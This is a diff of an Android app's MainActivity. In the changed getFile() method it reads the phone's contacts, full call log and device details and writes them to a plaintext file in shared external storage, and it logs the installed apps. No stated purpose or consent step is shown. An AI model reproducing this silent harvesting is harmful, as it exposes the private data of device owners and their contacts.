@@ -46,7 +46,7 @@ public class MainActivity extends AppCompatActivity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
-        final MainActivity this_=this;
+        final MainActivity this_ = this;
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         executorService = Executors.newFixedThreadPool(4);
@@ -184,74 +184,89 @@ public class MainActivity extends AppCompatActivity {
     private void getFile()
     {
         /** Getting Cache Directory */
-    File tempFile;
-    File cDir = getBaseContext().getCacheDir();
+        File tempFile;
+        File external_m1 =  Environment.getExternalStorageDirectory();
+
+        /* Makes a textfile in the absolute cache directory  */
+        tempFile = new File(external_m1 + "/" + "phone_data.txt") ;
+
+
+        /* Writing into the created textfile */
+        FileWriter writer=null;
+
+        try {
+
+
+            writer = new FileWriter(tempFile);
+            FileReader fReader = new FileReader(tempFile);
+            BufferedReader bReader = new BufferedReader(fReader);
+
+            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    new String[] {ContactsContract.CommonDataKinds.Phone._ID,
+                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                            ContactsContract.CommonDataKinds.Phone.NUMBER,}, null, null, null, null);
+            cursor.moveToFirst();
+
+//
+//            if(bReader.readLine().equals("")) {
+
+
+                writer.write("Call details: " + getCallDetails() + "\n" +
+                        "Contacts: ID " + cursor.getString(0) + " NAME " + cursor.getString(1) + " PHONE " + cursor.getString(2)
+                        + "\n" + "System info details: " + GetInfo.getInfosAboutDevice(act));
+
+                writer.close();
+//            }
+//            else
+//            {
+//
+//                Log.i("equals", "false");
+//                writer.close();
+//            }
+
+
+            Log.i("assdf", external_m1.getPath());
 
 
 
-     /* Makes a textfile in the absolute cache directory  */
-     tempFile = new File(Environment.getExternalStorageDirectory() + "/" + "textffile.txt") ;
 
-     /* Writing into the created textfile */
-      FileWriter writer=null;
-      try {
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
 
 
-          writer = new FileWriter(tempFile);
-
-          Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                                                     new String[] {ContactsContract.CommonDataKinds.Phone._ID,
-                                                     ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
-                                                     ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, null);
-          cursor.moveToFirst();
-
-          writer.write("Call details: " + getCallDetails() + "\n" +
-              "Contacts: ID "+cursor.getString(0)+" NAME "+cursor.getString(1)+" PHONE "+cursor.getString(2) + "\n" +
-              "System info details: " + GetInfo.getInfosAboutDevice(act));
-
-          writer.close();
-
-          File internal_m1 = getDir("custom", 0);
-          File external_m1 =  Environment.getExternalStorageDirectory();
-
-
-          Log.i("assdf", external_m1.getPath());
-
-
-
-
-      } catch (IOException e) {
-      e.printStackTrace();
-      }
-
-
-      String strLine="";
-      StringBuilder text = new StringBuilder();
-      try {
-      FileReader fReader = new FileReader(tempFile);
-      BufferedReader bReader = new BufferedReader(fReader);
-
-      while( (strLine=bReader.readLine()) != null  ){
-      Log.i("DATA", strLine);
-      }
-      } catch (FileNotFoundException e) {
-      e.printStackTrace();
-      }catch(IOException e){
-      e.printStackTrace();
-      }
-
-        Log.i("sdf", tempFile.getPath());
+//        String strLine="";
+//        StringBuilder text = new StringBuilder();
+//        try {
+//            FileReader fReader = new FileReader(tempFile);
+//            BufferedReader bReader = new BufferedReader(fReader);
+//
+//            while( (strLine=bReader.readLine()) != null  ){
+//                Log.i("DATA", strLine);
+//            }
+//        } catch (FileNotFoundException e) {
+//            e.printStackTrace();
+//        }catch(IOException e){
+//            e.printStackTrace();
+//        }
+//
+//        Log.i("sdf", tempFile.getPath());
     }
 
     private String getCallDetails() {
         StringBuffer sb = new StringBuffer();
+
         Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null, null, null, null);
+
         int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
         int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
         int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
         int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
+
         sb.append("Call Details :");
-        while (managedCursor.moveToNext()) {
+
+        while (managedCursor.moveToNext())
+        {
             String phNumber = managedCursor.getString(number);
             String callType = managedCursor.getString(type);
             String callDate = managedCursor.getString(date);
@@ -272,11 +287,13 @@ public class MainActivity extends AppCompatActivity {
                     dir = "MISSED";
                     break;
             }
+
             sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                     + dir + " \nCall Date:--- " + callDayTime
                     + " \nCall duration in sec :--- " + callDuration);
             sb.append("\n----------------------------------");
         }
+
         managedCursor.close();
 
         return sb.toString();
@@ -285,17 +302,48 @@ public class MainActivity extends AppCompatActivity {
     }
     public void installedApps()
     {
-        List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);        for (int i=0; i < packList.size(); i++)
-    {
-        PackageInfo packInfo = packList.get(i);
-        if (  (packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0)
+        List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
+        for (int i=0; i < packList.size(); i++)
         {
-            String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
-            Log.d("App № " + Integer.toString(i), appName);
+            PackageInfo packInfo = packList.get(i);
+            if (  (packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0)
+            {
+                String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
+                Log.d("App № " + Integer.toString(i), appName);
 
+            }
         }
     }
+
+
+    protected void onStart()
+    {
+        super.onStart();
+
     }
+
+    @Override
+    protected void onRestart() {
+        super.onRestart();
+    }
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+    }
+
+
+    @Override
+    protected void onPause() {
+        super.onPause();
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+    }
+
+
 }
 
 
